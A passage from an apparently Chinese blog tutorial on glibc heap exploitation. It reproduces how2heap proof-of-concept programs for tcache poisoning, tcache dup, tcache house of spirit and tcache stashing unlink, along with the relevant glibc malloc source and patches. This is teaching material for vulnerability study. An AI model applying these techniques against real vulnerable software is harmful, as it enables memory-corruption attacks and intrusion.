class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">                    <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="keyword">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="keyword">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实large bin chunk之所以可以修改两个值，原因就在于large bin chunk在从链上移除时会修改两对指针：fd与bk指针以及fd_nextsize与bk_nextsize，其利用和unsorted bin attack并无两样。</p>
<p>实际中large bin attack也是无具体用途的，一般和Unsorted Bin Attack一样用来修改global_max_fast 以扩大fastbin的chunk大小辅助fast bin attack。</p>
<h3 id="Tcache-attack"><a href="#Tcache-attack" class="headerlink" title="Tcache attack"></a>Tcache attack</h3><p><code>tcache makes heap exploitation easy again</code></p>
<p>tcache的结构前面已经说过。tcache的优先级目前是最高的，与fastbin相似，也是多个后进先出单链表以及对应的链表chunk的计数器组成的。tcache attack也与fastbin attack有很多相似的地方</p>
<h4 id="tcache-poison"><a href="#tcache-poison" class="headerlink" title="tcache poison"></a>tcache poison</h4><p>覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可malloc 到任何地址。还是shellphish的how2heap的例子<a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c">tcache_poisoning</a>(glibc_2.26)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// disable buffering</span></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">size_t</span> stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">	b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用一个可以覆盖chunk fd字段的漏洞，实现对free后chunk的fd覆盖，其实也就是指向下一个tcache的地址指针的覆盖即可在tcache链伪造一个chunk，之后申请回这个chunk即可实现任意地址写。</p>
<h4 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h4><p>tcache在调用<code>tcache_put</code>时并没有做安全检查(没有检查chunk是否已经在tcache中了)，所以可以对一个chunk进行多次free，这是此利用手法的关键，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*将一个chunk放回tcache中*/</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/*chunk转为mem指针*/</span></span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  <span class="comment">//设置放回头部</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);<span class="comment">//计数器自增</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以 how2heap 的 <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_dup.c">tcache_dup</a> 做说明：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates a simple double-free attack with tcache.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating buffer.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing twice...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p ].\n&quot;</span>, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Next allocated buffers will be same: [ %p, %p ].\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>), <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对一个chunk多次free后，tcache中将会有两个相同的chunk，两次malloc后可以得到这两个第一一样的chunk，出现多个指针控制同一个chunk。相比<code>fastbin dup</code>也更加简单.</p>
<h5 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h5><p>在新的glibc(2.26没有，但2.29有) 的patch中，这种手法已经得到了修补，具体来说是在<code>tcache_entry</code>结构体新增了key，并且遍历了tcache链表。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/*找对应到tcache的index*/</span></span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">	tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">	   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">	   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">	   coincidence before aborting.  */</span></span><br><span class="line">  <span class="comment">/*遍历链表看是不是有相同的tcache chunk 防止double free*/</span></span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_entry *tmp;</span><br><span class="line">	    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">	    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">		 tmp;</span><br><span class="line">		 tmp = tmp-&gt;next)</span><br><span class="line">	      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">		malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">	    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">	       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">	  &#125;</span><br></pre></td></tr></table></figure>

<p>这里由于</p>
<h4 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h4><p>简单地说，就是寻找方法(比如前面说的tcache poison)尝试去控制<code>tcache_perthread_struct</code>结构体。</p>
<h4 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h4><p>将伪造的chunk进行free后放入tcache中。</p>
<p>和fastbin attack有相似之处，而且更加简单。由于没有检测下一个chunk，所以这里只需要伪造一个chunk即可。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates the house of spirit attack on tcache.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;It works in a similar way to original house of spirit but you don&#x27;t need to create fake chunk after the fake chunk that will be freed.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#x27;s size and prev_inuse are sane.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="smallchunk2tcache-unsafe-unlink"><a href="#smallchunk2tcache-unsafe-unlink" class="headerlink" title="smallchunk2tcache unsafe unlink"></a>smallchunk2tcache unsafe unlink</h4><p> smallbin 中包含有空闲块的时候，会同时将同大小的其他空闲块，放入 tcache 中，此时也会出现解链操作，但相比于 unlink 宏，缺少了链完整性校验。</p>
<p>下面便是glibc中上述所说部分的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">       <span class="comment">/*当从这个small bin中找到一个可用chunk后，会把bin上其他的所有chunk都放入tcache*/</span></span><br><span class="line">	  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">          <span class="comment">/*这里是先从链上取下chunk，类似于unlink操作，不过相比之下更加的简单，没有安全检查  tcache smallbin unlink*/</span></span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line">          <span class="comment">/*将取下的chunk放入tcache中*/</span></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>可以看到只是简单的脱链操作，没有任何安全检查。</p>
<h4 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h4><p>以 <code>how2heap</code> 中的 <code>tcache_stashing_unlink_attack.c</code> 为例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 tcache</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted 